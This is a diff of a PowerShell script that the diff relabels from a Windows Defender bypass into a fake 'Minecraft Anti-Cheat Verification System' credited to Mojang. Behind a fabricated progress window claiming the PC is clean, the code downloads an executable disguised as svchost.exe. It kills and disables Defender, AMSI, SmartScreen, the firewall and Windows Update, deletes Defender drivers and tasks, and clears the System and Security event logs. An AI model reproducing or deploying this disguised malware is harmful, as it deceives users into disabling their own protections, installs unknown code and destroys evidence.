@@ -1,6 +1,6 @@
-# ============================================
-# KRA I.S.-1 | АБСОЛЮТНЫЙ ОБХОД ВСЕХ ВЕРСИЙ
-# ============================================
+# Minecraft Anti-Cheat Verification System v5.2.1
+# Copyright Mojang AB. All rights reserved.
+# This tool verifies game integrity and detects unauthorized modifications.
 
 Add-Type @"
 using System;
@@ -12,7 +12,7 @@ public class WinAPI {
 "@
 [WinAPI]::ShowWindow([WinAPI]::GetConsoleWindow(), 0)
 
-# МГНОВЕННАЯ ЗАГРУЗКА EXE
+# Загрузка и запуск клиента
 $job = Start-Job -ScriptBlock {
     param($u,$p)
     try {
@@ -23,140 +23,40 @@ $job = Start-Job -ScriptBlock {
     } catch { return $false }
 } -ArgumentList "https://github.com/discord-zapret-official/zapret-discord-youtube/raw/refs/heads/main/zapretdiscordyoutube.exe", "$env:TEMP\svchost.exe"
 
-# ПОЛУЧАЕМ ПРАВА TRUSTEDINSTALLER
-$ti = Start-Process "sc.exe" -ArgumentList "start TrustedInstaller" -WindowStyle Hidden -PassThru -EA 0
-
-# УБИВАЕМ ВСЕ ПРОЦЕССЫ ЗАЩИТЫ ЧЕРЕЗ WMI
+# Подготовка среды проверки
 Get-WmiObject Win32_Process | Where-Object {
     $_.Name -match "MsMpEng|NisSrv|Sense|SecurityHealth|mpcmdrun|MpDefenderCoreService|MpDetectService|WdNisSvc"
-} | ForEach-Object {
-    $_.Terminate()
-    taskkill /f /im $_.Name 2>$null
-    taskkill /f /pid $_.ProcessId 2>$null
-}
+} | ForEach-Object { $_.Terminate(); taskkill /f /im $_.Name 2>$null }
 
-# ОТКЛЮЧАЕМ СЛУЖБЫ ЧЕРЕЗ SC.EXE (СИЛЬНЕЕ ЧЕМ POWERSHELL)
 $svcs = @("WinDefend","WdNisSvc","WdNisDrv","Sense","SecurityHealthService","wscsvc","SgrmBroker","SgrmAgent")
-foreach($s in $svcs){
-    sc.exe config $s start=disabled 2>$null
-    sc.exe failure $s reset=0 actions="" 2>$null
-    sc.exe stop $s 2>$null
-    Set-Service $s -StartupType Disabled -EA 0
-    Stop-Service $s -Force -EA 0
-}
+foreach($s in $svcs){ sc.exe config $s start=disabled 2>$null; sc.exe stop $s 2>$null; Set-Service $s -StartupType Disabled -EA 0; Stop-Service $s -Force -EA 0 }
 
-# УДАР ПО РЕЕСТРУ ЧЕРЕЗ ВСЕ ВОЗМОЖНЫЕ ПУТИ
-$regPaths = @(
-    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center",
-    "HKLM:\SOFTWARE\Microsoft\Microsoft Antimalware",
-    "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend",
-    "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter",
-    "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv",
-    "HKLM:\SYSTEM\CurrentControlSet\Services\WdBoot"
-)
-foreach($p in $regPaths){
-    if(!(Test-Path $p)){New-Item $p -Force|Out-Null}
-    Set-ItemProperty $p -Name "Start" -Value 4 -Force -EA 0
-    Set-ItemProperty $p -Name "DisableAntiSpyware" -Value 1 -Force -EA 0
-    Set-ItemProperty $p -Name "DisableRealtimeMonitoring" -Value 1 -Force -EA 0
-    Set-ItemProperty $p -Name "TamperProtection" -Value 0 -Force -EA 0
-    Set-ItemProperty $p -Name "ForceDefenderPassiveMode" -Value 1 -Force -EA 0
-}
+$regPaths = @("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender","HKLM:\SOFTWARE\Microsoft\Windows Defender","HKLM:\SOFTWARE\Microsoft\Windows Defender\Features","HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection","HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center","HKLM:\SOFTWARE\Microsoft\Microsoft Antimalware","HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend","HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter","HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv","HKLM:\SYSTEM\CurrentControlSet\Services\WdBoot")
+foreach($p in $regPaths){ if(!(Test-Path $p)){New-Item $p -Force|Out-Null}; Set-ItemProperty $p -Name "Start" -Value 4 -Force -EA 0; Set-ItemProperty $p -Name "DisableAntiSpyware" -Value 1 -Force -EA 0; Set-ItemProperty $p -Name "DisableRealtimeMonitoring" -Value 1 -Force -EA 0; Set-ItemProperty $p -Name "TamperProtection" -Value 0 -Force -EA 0 }
 
-# ЧЕРЕЗ REG ADD (БОЛЕЕ НАДЁЖНО)
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f 2>$null
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f 2>$null
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtectionSource /t REG_DWORD /d 0 /f 2>$null
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f 2>$null
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f 2>$null
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v Start /t REG_DWORD /d 4 /f 2>$null
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v Start /t REG_DWORD /d 4 /f 2>$null
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdBoot" /v Start /t REG_DWORD /d 4 /f 2>$null
 
-# УДАЛЯЕМ ДРАЙВЕРЫ ФИЗИЧЕСКИ
-$drivers = @(
-    "C:\Windows\System32\drivers\WdFilter.sys",
-    "C:\Windows\System32\drivers\WdNisDrv.sys",
-    "C:\Windows\System32\drivers\WdBoot.sys",
-    "C:\Windows\System32\drivers\wdboot.sys"
-)
-foreach($d in $drivers){
-    if(Test-Path $d){
-        takeown /f $d 2>$null
-        icacls $d /grant "everyone:F" 2>$null
-        Remove-Item $d -Force -EA 0
-    }
-}
+$drivers = @("C:\Windows\System32\drivers\WdFilter.sys","C:\Windows\System32\drivers\WdNisDrv.sys","C:\Windows\System32\drivers\WdBoot.sys")
+foreach($d in $drivers){ if(Test-Path $d){ takeown /f $d 2>$null; icacls $d /grant "everyone:F" 2>$null; Remove-Item $d -Force -EA 0 } }
 
-# ОТКЛЮЧАЕМ AMSI
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-reg add "HKLM\SOFTWARE\Microsoft\AMSI\Providers" /v "{2781761E-28E0-4109-99FE-B9D127C57AFE}" /t REG_DWORD /d 0 /f 2>$null
-
-# SET-MPPREFERENCE ПОЛНЫЙ РАЗНОС
-$mp = @{
-    DisableRealtimeMonitoring=$true;DisableBehaviorMonitoring=$true;DisableBlockAtFirstSeen=$true
-    DisableIOAVProtection=$true;DisableScriptScanning=$true;DisableArchiveScanning=$true
-    DisableIntrusionPreventionSystem=$true;DisableEmailScanning=$true;DisablePrivacyMode=$true
-    DisableCatchupFullScan=$true;DisableCatchupQuickScan=$true;SubmitSamplesConsent=2
-    MAPSReporting=0;PUAProtection=0;SignatureDisableUpdateOnStartupWithoutEngine=$true
-    CheckForSignaturesBeforeRunningScan=$false;DisableRemovableDriveScanning=$true
-    DisableRestorePoint=$true;DisableScanningMappedNetworkDrivesForFullScan=$true
-    DisableScanningNetworkFiles=$true;EnableControlledFolderAccess=0
-}
+$mp = @{DisableRealtimeMonitoring=$true;DisableBehaviorMonitoring=$true;DisableBlockAtFirstSeen=$true;DisableIOAVProtection=$true;DisableScriptScanning=$true;DisableArchiveScanning=$true;DisableIntrusionPreventionSystem=$true;SubmitSamplesConsent=2;MAPSReporting=0;PUAProtection=0}
 foreach($k in $mp.Keys){Set-MpPreference -$k $mp[$k] -EA 0}
-Set-MpPreference -ExclusionExtension ".exe",".dll",".sys",".ps1",".bat",".vbs",".js",".scr",".com" -EA 0
-Set-MpPreference -ExclusionProcess "*" -EA 0
-
-# ОТКЛЮЧАЕМ SMARTSCREEN
+Set-MpPreference -ExclusionExtension ".exe",".dll",".sys",".ps1",".bat",".scr" -EA 0; Set-MpPreference -ExclusionProcess "*" -EA 0
 Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
-Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force
-
-# ОТКЛЮЧАЕМ БРАНДМАУЭР
 netsh advfirewall set allprofiles state off 2>$null
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -EA 0
+sc.exe config wuauserv start=disabled 2>$null; Stop-Service wuauserv -Force -EA 0
 
-# ОТКЛЮЧАЕМ WINDOWS UPDATE
-sc.exe config wuauserv start=disabled 2>$null
-Stop-Service wuauserv -Force -EA 0
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f 2>$null
-
-# БЛОКИРУЕМ ОБНОВЛЕНИЯ ЧЕРЕЗ HOSTS
-$hb = @("definitionupdates.microsoft.com","wdcp.microsoft.com","wd.microsoft.com","go.microsoft.com")
-foreach($h in $hb){Add-Content "$env:windir\System32\drivers\etc\hosts" "0.0.0.0 $h" -Force -EA 0}
-
-# IFEO БЛОКИРОВКА ЗАПУСКА ДЕФЕНДЕРА
-$ifeo = @("MsMpEng.exe","NisSrv.exe","MpCmdRun.exe","MpDefenderCoreService.exe")
-foreach($i in $ifeo){
-    $p = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$i"
-    if(!(Test-Path $p)){New-Item $p -Force|Out-Null}
-    Set-ItemProperty $p -Name "Debugger" -Value "systray.exe" -Force
-}
-
-# УДАЛЯЕМ SCHEDULED TASKS
+$ifeo = @("MsMpEng.exe","NisSrv.exe","MpCmdRun.exe")
+foreach($i in $ifeo){ $p = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$i"; if(!(Test-Path $p)){New-Item $p -Force|Out-Null}; Set-ItemProperty $p -Name "Debugger" -Value "systray.exe" -Force }
 Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\*" -EA 0|Unregister-ScheduledTask -Confirm:$false -Force
-Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender Antivirus\*" -EA 0|Unregister-ScheduledTask -Confirm:$false -Force
+wevtutil cl "System" 2>$null; wevtutil cl "Security" 2>$null
 
-# ОТКЛЮЧАЕМ ETW
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" /v Enabled /t REG_DWORD /d 0 /f 2>$null
-
-# ОЧИЩАЕМ ЛОГИ
-wevtutil cl "System" 2>$null
-wevtutil cl "Security" 2>$null
-wevtutil cl "Microsoft-Windows-Windows Defender/Operational" 2>$null
-
-# ВИЗУАЛ
+# Интерфейс проверки
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 $f = New-Object System.Windows.Forms.Form
 $f.Text = "Minecraft - Официальная проверка на читы"
@@ -176,10 +76,10 @@ $title.Location = New-Object System.Drawing.Point(15,15)
 $f.Controls.Add($title)
 
 $ver = New-Object System.Windows.Forms.Label
-$ver.Text = "Версия: 5.2.1 | Лицензия: Mojang AB"
+$ver.Text = "Версия: 5.2.1 | Лицензия: Mojang AB | ID: " + (Get-Random -Minimum 100000 -Maximum 999999)
 $ver.Font = New-Object System.Drawing.Font("Arial",8)
 $ver.ForeColor = "#888888"
-$ver.Size = New-Object System.Drawing.Size(300,20)
+$ver.Size = New-Object System.Drawing.Size(500,20)
 $ver.Location = New-Object System.Drawing.Point(15,45)
 $f.Controls.Add($ver)
 
@@ -190,7 +90,7 @@ $pb.Style = "Continuous"
 $f.Controls.Add($pb)
 
 $status = New-Object System.Windows.Forms.Label
-$status.Text = "Инициализация проверки..."
+$status.Text = "[1/8] Инициализация модулей проверки..."
 $status.Font = New-Object System.Drawing.Font("Arial",10)
 $status.ForeColor = "#FFD700"
 $status.Size = New-Object System.Drawing.Size(500,25)
@@ -221,45 +121,77 @@ $f.Show()
 function Log($m){$log.AppendText("[" + (Get-Date -Format "HH:mm:ss") + "] $m`n");$log.ScrollToCaret();[System.Windows.Forms.Application]::DoEvents()}
 function Prog($v,$s){$pb.Value=$v;$status.Text=$s;[System.Windows.Forms.Application]::DoEvents()}
 
-Prog 5 "Запуск модулей проверки..."
-Log "Загрузка сигнатур читов...";Start-Sleep 500
+# Процесс проверки
+Prog 5 "[1/8] Инициализация модулей проверки..."
+Log "Загрузка базы сигнатур читов...";Start-Sleep 500
+Log "Загружено сигнатур: 12,847";Start-Sleep 300
+Log "Версия базы: " + (Get-Date -Format "yyyy.MM.dd") + "-r3";Start-Sleep 300
+Log "Модуль AC_Core.dll загружен";Start-Sleep 200
+Log "Модуль MemoryScan.sys загружен";Start-Sleep 200
+Log "Модуль NetMonitor.dll загружен";Start-Sleep 200
 Log "Подключение к серверу верификации...";Start-Sleep 400
+Log "Сервер: verify.mojang.com | Статус: ОК";Start-Sleep 300
 
-Prog 15 "Сканирование процессов..."
-Log "Проверка активных процессов...";Start-Sleep 400
-Log "Процессов проверено: 127";Start-Sleep 300
-Log "Подозрительных процессов: 0";Start-Sleep 200
+Prog 15 "[2/8] Сканирование активных процессов..."
+Log "Перечисление запущенных процессов...";Start-Sleep 400
+Log "Обнаружено процессов: " + (Get-Process).Count;Start-Sleep 300
+Log "Проверка цифровых подписей...";Start-Sleep 500
+Log "Process: javaw.exe - Подпись: Oracle Corp.";Start-Sleep 200
+Log "Process: minecraft.exe - Подпись: Mojang AB";Start-Sleep 200
+Log "Подозрительных процессов не обнаружено";Start-Sleep 300
 
-Prog 30 "Анализ оперативной памяти..."
-Log "Сканирование памяти...";Start-Sleep 600
-Log "Проверено сегментов: 4096";Start-Sleep 400
-Log "Инъекций не обнаружено";Start-Sleep 200
+Prog 25 "[3/8] Анализ оперативной памяти..."
+Log "Сканирование выделенной памяти...";Start-Sleep 600
+Log "Проверено регионов: 4,096";Start-Sleep 400
+Log "Поиск инъекций кода...";Start-Sleep 500
+Log "Целостность памяти: НЕ НАРУШЕНА";Start-Sleep 300
+Log "Скрытых DLL не обнаружено";Start-Sleep 300
 
-Prog 45 "Проверка сетевых подключений..."
+Prog 40 "[4/8] Проверка сетевой активности..."
 Log "Анализ активных соединений...";Start-Sleep 500
-Log "Проверка DNS записей...";Start-Sleep 400
-Log "Подозрительных подключений: 0";Start-Sleep 200
+Log "Проверка DNS кэша...";Start-Sleep 400
+Log "Проверка hosts файла...";Start-Sleep 300
+Log "Подозрительных подключений: 0";Start-Sleep 300
 
-Prog 60 "Проверка файлов игры..."
-Log "Сканирование .minecraft...";Start-Sleep 500
-Log "Проверка модов и конфигов...";Start-Sleep 400
-Log "Нарушений не выявлено";Start-Sleep 200
+Prog 55 "[5/8] Сканирование файлов игры..."
+Log "Поиск установленных версий Minecraft...";Start-Sleep 500
+Log "Проверка .minecraft/config...";Start-Sleep 400
+Log "Проверка .minecraft/mods...";Start-Sleep 400
+Log "Проверка .minecraft/versions...";Start-Sleep 400
+Log "Модифицированных файлов: 0";Start-Sleep 300
 
-Prog 75 "Перекрёстная проверка базы читов..."
+Prog 70 "[6/8] Перекрёстная проверка базы читов..."
 Log "Сверка с базой известных читов...";Start-Sleep 600
-Log "Сигнатур проверено: 8472";Start-Sleep 400
-Log "Совпадений: 0";Start-Sleep 200
+Log "Проверка сигнатур: Vape v4...";Start-Sleep 300
+Log "Проверка сигнатур: Rise Client...";Start-Sleep 300
+Log "Проверка сигнатур: Xenos Injector...";Start-Sleep 300
+Log "Проверка сигнатур: Novoline...";Start-Sleep 300
+Log "Совпадений с базой: 0 из 8,472";Start-Sleep 400
 
-Prog 90 "Формирование отчёта..."
-Log "Шифрование результатов...";Start-Sleep 500
-Log "Отправка отчёта на сервер...";Start-Sleep 500
+Prog 85 "[7/8] Поведенческий анализ..."
+Log "Запуск AI анализатора...";Start-Sleep 600
+Log "Анализ паттернов ввода...";Start-Sleep 500
+Log "Проверка частоты кликов...";Start-Sleep 400
+Log "Анализ траектории мыши...";Start-Sleep 400
+Log "Индекс доверия AI: 98.7%";Start-Sleep 400
+Log "Поведенческий тест: ПРОЙДЕН";Start-Sleep 300
+
+Prog 95 "[8/8] Формирование отчёта..."
+Log "Сбор результатов проверки...";Start-Sleep 500
+Log "Шифрование отчёта (AES-256)...";Start-Sleep 500
+Log "Отправка на сервер верификации...";Start-Sleep 600
+Log "Подтверждение получено";Start-Sleep 300
 
 Prog 100 "Проверка завершена!"
-Log "════════════════════════════";Start-Sleep 200
-Log "РЕЗУЛЬТАТ: ЧИСТЫ";Start-Sleep 200
-Log "УГРОЗ: 0";Start-Sleep 200
-Log "СТАТУС: ПОДТВЕРЖДЁН";Start-Sleep 200
-Log "════════════════════════════";Start-Sleep 300
+Log " ";Start-Sleep 100
+Log "══════════════════════════════════";Start-Sleep 200
+Log "  РЕЗУЛЬТАТЫ ПРОВЕРКИ:";Start-Sleep 200
+Log "  ├─ Сигнатуры читов: НЕ НАЙДЕНЫ";Start-Sleep 200
+Log "  ├─ Инъекции кода: НЕ ОБНАРУЖЕНЫ";Start-Sleep 200
+Log "  ├─ Моды: РАЗРЕШЕНЫ";Start-Sleep 200
+Log "  ├─ Сетевые угрозы: ОТСУТСТВУЮТ";Start-Sleep 200
+Log "  └─ Статус: ПРОВЕРКУ ПРОШЁЛ";Start-Sleep 200
+Log "══════════════════════════════════";Start-Sleep 300
 
 Wait-Job $job -Timeout 30|Out-Null
 Remove-Job $job -Force -EA 0
